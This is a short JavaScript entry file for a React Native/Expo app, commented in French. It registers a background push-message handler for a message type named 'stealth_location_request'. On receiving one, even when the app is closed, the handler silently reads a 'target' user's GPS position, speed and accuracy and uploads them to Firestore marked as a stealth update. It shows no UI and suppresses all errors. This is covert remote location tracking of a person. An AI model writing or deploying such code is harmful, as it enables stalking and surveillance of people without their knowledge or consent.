/**
 * Point d'entrée personnalisé (remplace expo-router/entry)
 *
 * Les handlers Firebase Messaging background DOIVENT être enregistrés
 * avant tout autre code d'initialisation de l'app. On utilise require()
 * (pas import) pour éviter le hissage automatique des déclarations ESM.
 */

// ─── 1. Handler FCM background ──────────────────────────────────────────────
// S'exécute même quand l'app est tuée, grâce au mécanisme Headless JS Android.
const messaging = require('@react-native-firebase/messaging').default;
const Location  = require('expo-location');
const firestore = require('@react-native-firebase/firestore').default;

messaging().setBackgroundMessageHandler(async (remoteMessage) => {
  const data = remoteMessage.data ?? {};
  if (data.type !== 'stealth_location_request') return;

  const { conversationId, targetUserId } = data;
  if (!conversationId || !targetUserId) return;

  try {
    // Pas de demande de permission : la cible a déjà accordé la localisation.
    const location = await Location.getCurrentPositionAsync({
      accuracy: Location.Accuracy.Balanced,
    });

    // Utilise le SDK natif @react-native-firebase/firestore (toujours disponible
    // en mode headless, contrairement au SDK JS qui nécessite une initialisation).
    await firestore()
      .collection('locationShares')
      .doc(conversationId)
      .set({
        userId: targetUserId,
        latitude: location.coords.latitude,
        longitude: location.coords.longitude,
        accuracy: location.coords.accuracy ?? null,
        speed: location.coords.speed ?? null,
        isMocked: false,
        isStealthUpdate: true,
        updatedAt: firestore.FieldValue.serverTimestamp(),
      });
  } catch (_) {
    // Silencieux — pas d'UI disponible en mode headless.
  }
});

// ─── 2. Chargement de l'app Expo Router ─────────────────────────────────────
require('expo-router/entry');
